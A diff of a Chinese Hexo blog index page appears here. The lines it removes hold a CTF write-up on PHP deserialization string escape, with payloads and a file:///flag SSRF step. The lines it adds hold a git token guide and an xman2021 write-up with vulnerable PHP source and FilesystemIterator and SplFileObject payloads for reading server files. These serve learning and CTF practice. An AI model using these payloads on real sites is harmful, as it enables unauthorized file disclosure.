+          <a class="article-more-a" href="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/">展开全文 >></a>
         </p>
       
 
@@ -1034,14 +930,14 @@
     </section>
   
   
-    <article id="post-bugku-web-web41-newphp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-个人令牌" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/11/bugku-web-web41-newphp/">bugku-web-web41-newphp</a>
+      <a class="article-title" href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/">git个人令牌</a>
     </h1>
   
 
@@ -1049,36 +945,29 @@
         
 
 
-<a href="/2021/07/11/bugku-web-web41-newphp/" class="archive-article-date">
-  	<time datetime="2021-07-11T13:50:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
+<a href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/" class="archive-article-date">
+  	<time datetime="2021-08-09T07:48:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>newphp(web41)<br>这道题卡了很久，主要是在纠结一个弱智的问题：在序列里放一个序列，能不能一次性反序化了（以及其格式问题）。</p>
-<p>先说题目。<br>初始界面，读代码——</p>
-<img src="/2021/07/11/bugku-web-web41-newphp/1.PNG" class="" title="1.PNG">
-<img src="/2021/07/11/bugku-web-web41-newphp/2.PNG" class="" title="2.PNG">
-<p>从上往下简单解读一下：<br>1.evil类：<br>    建一个公有的$hint<br>    construct 构造函数,读取传入的值给hint赋值<br>    destruct 析构函数，判断hint的值，若是则输出base64加密后的文件内容<br>    wakeup函数，unserialize()后调用，判断hint，换值（需要绕过）<br>2.User类：<br>    构造的时候接收两个值(username,password)，并分别赋值<br>3.write，read<br>    分别是把字符串中的*换成\0\0\0（一换三）和\0\0\0换成*(三换一)<br>4.主函数<br>    post方式接收username和password<br>    创建一个User的对象，序列化后赋给$a<br>    简单判断后<br>    对write和read函数处理过的$a进行反序化还原</p>
-<p>思路：<br>利用write和read进行字符串逃逸<br>这里只需要利用read就够了。<br>举个简单的例子：<br>字符串O:4:”User”:2:{s:8:”username”;s:3:”\0\0\0”;s:8:”password”;s:2:”12”}<br>在经历read函数变换后变成O:4:”User”:2:{s:8:”username”;s:3:”*“;s:8:”password”;s:2:”12”}<br>字符串内容（长度）虽然变了，但是前面要读取的字符串长度还是3，就会多往后读两位，导致引号（“）不闭合，这样明显就会造成代码错误。<br>而这是如果我们利用”\0\0\0”的数量来控制要“消去”的东西，然后在后面人为加一个引号(“)就可以实现加入自己相加的东西。<br>很明显，这里需要我们触发evil类，这里就要用到“序列嵌套”的东西，也就是我一开始说的最纠结的东西，可以参考另一篇——<a target="_blank" rel="noopener" href="https://ouroborosscr.github.io/2021/07/11/%E5%B5%8C%E5%A5%97%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%8C%96%E9%97%AE%E9%A2%98/">https://ouroborosscr.github.io/2021/07/11/%E5%B5%8C%E5%A5%97%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%8C%96%E9%97%AE%E9%A2%98/</a><br>简单来说，就是把<br>s:8:”username”<br>s:3:”\0\0\0”<br>s:8:”password”<br>s:2:”12”<br>四个部分的任意一个完全替换成O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}就可以在反序化的时候触发evil类。<br>主要的难点是去掉前面的s<br>因为有两个传入点（username和password）<br>所以我们用username传\0\0\0，用password传O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}</p>
-<p>我先改造了一下原来的代码，用123做了测试——</p>
-<img src="/2021/07/11/bugku-web-web41-newphp/3.PNG" class="" title="3.PNG">
-<p>得到序列为O:4:”User”:2:{s:8:”username”;s:3:”123”;s:8:”password”;s:41:”O:4:”evil”:1:{s:4:”hint”;s:8:”hint.php”;}”;}<br>这里只需要替换123为多个“\0\0\0”使前面的数字增大，目的是把;s:8:”password”;s:41:”给包括(主要是“s:41:”，相当于换上面所说的第三四部分)，和后面的引号闭合。<br>因为是2换1，所以只能在后面加一个没用的字符a，用8个“\0\0\0”来换。<br>得到payload——<br>username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a”;O:4:”evil”:1:{s:4:”hint”;s:8:”hint.php”;}</p>
-<img src="/2021/07/11/bugku-web-web41-newphp/4.PNG" class="" title="4.PNG">
-<p>输入后发现还需要绕过最开始的判断，把1改成2（类似于数组绕过）（不太确定）——<br>username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a”;O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}<br>得到一串base64加密码</p>
-<img src="/2021/07/11/bugku-web-web41-newphp/5.PNG" class="" title="5.PNG">
-<p>也可以多此一举的加上password（更严格的换第四部分）<br>username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a”;s:8:”password”;O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}</p>
-<img src="/2021/07/11/bugku-web-web41-newphp/6.PNG" class="" title="6.PNG">
+        <hr>
+<h2 id="关于2021年8月13日后git不接受账号密码修改的应对"><a href="#关于2021年8月13日后git不接受账号密码修改的应对" class="headerlink" title="关于2021年8月13日后git不接受账号密码修改的应对"></a>关于2021年8月13日后git不接受账号密码修改的应对</h2><p>今天上传博客的时候，我在配置好ssh的情况下被要求输入账号和密码，并且接到这样一条邮件——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You recently used a password to access the repository at ouroborosscr&#x2F;ouroborosscr.github.io with git using git&#x2F;2.9.0.windows.1.</span><br><span class="line"></span><br><span class="line">Basic authentication using a password to Git is deprecated and will soon no longer work. Visit https:&#x2F;&#x2F;github.blog&#x2F;2020-12-15-token-authentication-requirements-for-git-operations&#x2F; for more information around suggested workarounds and removal dates.</span><br></pre></td></tr></table></figure>
+<p>意思是以后这种方法将会被弃用，原来的ssh都会因此而作废，这就导致市面上大多数hexo的教程可能会因此失效（毕竟将无法上传）<br>根据建议打开网站——<a target="_blank" rel="noopener" href="https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/">https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/</a></p>
+<p>了解到需要“个人访问令牌”，那就顺着流程做——<a target="_blank" rel="noopener" href="https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token">https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token</a></p>
+<p>其中，权限只选中repo就够了。</p>
+<p>跟着流程创建完之后，<code>git --verdion</code>检查一下自己git的版本，如果低于2.29，就下一个最新版安装——<a target="_blank" rel="noopener" href="https://github.com/git-for-windows/git/releases/tag/v2.32.0.windows.2">https://github.com/git-for-windows/git/releases/tag/v2.32.0.windows.2</a></p>
+<p>然后换https（这里只列举https，换git的方法差不多，但是这样的有一个好处是比ssh传输速度快很多），打开cmd（或git bush）输入git remote -v查看自己连接的库<br>如果报错，就是权限不够，先输一个git init，再输入<br>如果什么回显都没有，就是没有连接，直接输入<code>git remote add origin &quot;https://github.com/USERNAME/REPOSITORY.git&quot;</code><br>(记得改成自己的用户名和库名)<br>如果有类似</p>
+<figure class="highlight plain"><figcaption><span>git remote -v</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; origin  git@github.com:USERNAME&#x2F;REPOSITORY.git (fetch)</span><br><span class="line">&gt; origin  git@github.com:USERNAME&#x2F;REPOSITORY.git (push)</span><br></pre></td></tr></table></figure>
+<p>这样的回显，就输入<code>$ git remote set-url origin git@github.com:USERNAME/REPOSITORY.git</code>(记得改成自己的用户名和库名)</p>
+<p>然后输入git remote -v测试一下就行了<br>改后——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line"># Verify new remote URL</span><br><span class="line">&gt; origin  https:&#x2F;&#x2F;github.com&#x2F;USERNAME&#x2F;REPOSITORY.git (fetch)</span><br><span class="line">&gt; origin  https:&#x2F;&#x2F;github.com&#x2F;USERNAME&#x2F;REPOSITORY.git (push)</span><br></pre></td></tr></table></figure>
 
-<p>解码base64得到一个网址，打开以后是一个ssrf，直接file:///flag就行了</p>
-<img src="/2021/07/11/bugku-web-web41-newphp/7.PNG" class="" title="7.PNG">
-<img src="/2021/07/11/bugku-web-web41-newphp/8.PNG" class="" title="8.PNG">
-<img src="/2021/07/11/bugku-web-web41-newphp/9.PNG" class="" title="9.PNG">
-
-<p>然后补充一下，在学ssrf的时候，发现了一个视频感觉真的不错——<br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1wK411V7KM/?spm_id_from=333.788.recommend_more_video.1">https://www.bilibili.com/video/BV1wK411V7KM/?spm_id_from=333.788.recommend_more_video.1</a><br>虽然是一个学生做的，但是普通话很标准并且不拖拉（这很重要，机构的老师不是一口台湾方言就是语速慢的要死，很容易睡着），提前准备过不至于不知道讲什么，从原理来讲述，也讲的很全面，属于好看不火进不了搜索首页的那种（不愧是b站）</p>
-<p>再有就是涅普科技的视频——<br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1VA411u7Tg?p=8">https://www.bilibili.com/video/BV1VA411u7Tg?p=8</a><br>缺点是明显感觉准备不充分（语速，进度，不熟练讲课等方面），不过推荐的方法很实用。</p>
+<p>之后在运行hexo d 的时候，明显传输速度直线上升</p>
+<p>后来发现，也可能是因为我原来用ssh传输太慢，可能某次修改的时候，把原来的ssh的库给换掉了，其实直接<code>git remote add origin &quot;git@github.com:USERNAME/REPOSITORY.git&quot;</code>也可以换回ssh，也能应付这种情况，但是问题是速度是真的慢，和被墙了一样</p>
 
       
 
@@ -1091,7 +980,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/11/bugku-web-web41-newphp/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/">展开全文 >></a>
         </p>
       
 
@@ -1143,14 +1032,14 @@
     </section>
   
   
-    <article id="post-嵌套的反序化问题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-xman2021-easyphp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/11/%E5%B5%8C%E5%A5%97%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%8C%96%E9%97%AE%E9%A2%98/">嵌套的反序化问题</a>
+      <a class="article-title" href="/2021/08/08/xman2021-easyphp/">xman2021-easyphp</a>
     </h1>
   
 
@@ -1158,26 +1047,26 @@
         
 
 
-<a href="/2021/07/11/%E5%B5%8C%E5%A5%97%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%8C%96%E9%97%AE%E9%A2%98/" class="archive-article-date">
-  	<time datetime="2021-07-11T13:00:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
+<a href="/2021/08/08/xman2021-easyphp/" class="archive-article-date">
+  	<time datetime="2021-08-08T12:15:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-08</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>嵌套的反序化问题</p>
-<p>（源于我做题时的一个疑问）</p>
-<p>直接说结果：<br>如果一个序列类似：<br>O:4:”User”:2:{s:8:”username”;i:123;s:8:”password”;O:4:”evil”:1:{s:4:”hint”;N;}}<br>这种“类中有类”的格式，进行unserialize反序化操作，<br>是否合法？反序化外层后，字符串中的“O:4:”evil”:1:{s:4:”hint”;N;}”是否也会反序化（还是保留）？<br>答案：合法，并且所有O开头的内容都会被反序化。（相当于先反序化最外层，再逐个检索所有的实参和形参的位置，若其本来格式还可以反序化，则继续反序化，直到没有可以反序化的为止）</p>
-<p>下面进行大体的解释：<br>为了方便解释，整个解释都会以下面的两个类为基础——</p>
-<img src="/2021/07/11/%E5%B5%8C%E5%A5%97%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%8C%96%E9%97%AE%E9%A2%98/fan1.PNG" class="" title="fan1.PNG">
+        <p>dasctf的原题,就改了一下文件结构和类名</p>
+<p>源码——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class;</span><br><span class="line">    public $para;</span><br><span class="line">    public $check;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;class &#x3D; &quot;Hel&quot;;</span><br><span class="line">        $this-&gt;para &#x3D; &quot;xctfer&quot;;</span><br><span class="line">        echo new  $this-&gt;class ($this-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;check &#x3D; new Filter;</span><br><span class="line">        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;</span><br><span class="line">            echo new  $this-&gt;class ($this-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            die(&#39;what?Really?&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Hel&#123;</span><br><span class="line">    var $a;</span><br><span class="line">    public function __construct($a)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a &#x3D; $a;</span><br><span class="line">        echo (&quot;Hello bro, I guess you are a lazy &quot;.$this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Filter&#123;</span><br><span class="line"></span><br><span class="line">    function vaild($code)&#123;</span><br><span class="line">        $pattern &#x3D; &#39;&#x2F;[!|@|#|$|%|^|&amp;|*|&#x3D;|\&#39;|&quot;|:|;|?]&#x2F;i&#39;;</span><br><span class="line">        if (preg_match($pattern, $code))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;xctf&#39;]))&#123;</span><br><span class="line">    unserialize($_GET[&#39;xctf&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a&#x3D;new XMAN;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这句我一开始不太明白这句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new  $this-&gt;class ($this-&gt;para);</span><br></pre></td></tr></table></figure>
+<p>然后搜了一下，结果就直接搜到原题了</p>
+<p>这句的意思是：$this-&gt;class函数的参数是$this-&gt;para</p>
+<p>所以payload——<br>用FilesystemIterator遍历目录(把/换成文件夹，直到找到要打开的文件夹)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class&#x3D;&#39;FilesystemIterator&#39;;</span><br><span class="line">    public $para&#x3D;&quot;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">$o  &#x3D; new XMAN();</span><br><span class="line">echo serialize($o);</span><br></pre></td></tr></table></figure>
 
-<p>首先，php并不支持“类的嵌套”，也就是说下图这种格式是不合法的，所以我说的“嵌套”其实只是反序化比较像在class里构建了一个class——</p>
-<img src="/2021/07/11/%E5%B5%8C%E5%A5%97%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%8C%96%E9%97%AE%E9%A2%98/fan2.PNG" class="" title="fan2.PNG">
-
-<p>这里就要先纠正我以前一个误区——<br>O:4:”User”:2:{s:8:”username”;i:123;s:8:”password”;i:456}<br>这句话反序化以后并不是等价于class User这个类，<br>它单纯等价于new User(username=123,password=456);的过程<br>所以O:4:”User”:2:{s:8:”username”;i:123;s:8:”password”;O:4:”evil”:1:{s:4:”hint”;N;}}<br>其实等价于new User(username=123,password=(new evil));(或者更标准的是new User(123,new evil);)，这样就会好理解很多。</p>
-<p>但是使用的时候，需要实现某一个需要反序化的部分“整个替换”</p>
-<p>比如O:4:”User”:2:{s:2:”p1”;i:p2;s:2:”p3”;i:p4}<br>想要把O:4:”evil”:1:{s:4:”hint”;N;}替换上去，让其触发evil类，<br>能替换的部分分别为——<br>s:2:”p1”<br>i:p2<br>s:2:”p3”<br>i:p4<br>不能有多余的s或i残留，所以最好在字符逃逸漏洞中使用，参考——<a target="_blank" rel="noopener" href="https://blog.csdn.net/dengyu810/article/details/103213750">https://blog.csdn.net/dengyu810/article/details/103213750</a></p>
+<p>用SplFileObject读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class&#x3D;&#39;SplFileObject&#39;;</span><br><span class="line">    public $para &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;xxxXXXmMManNNn&#x2F;f1a4.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new XMAN();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
 
       
 
@@ -1190,7 +1079,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/11/%E5%B5%8C%E5%A5%97%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%8C%96%E9%97%AE%E9%A2%98/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/08/08/xman2021-easyphp/">展开全文 >></a>
         </p>
       
 
@@ -1244,7 +1133,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
     </nav>
   
 
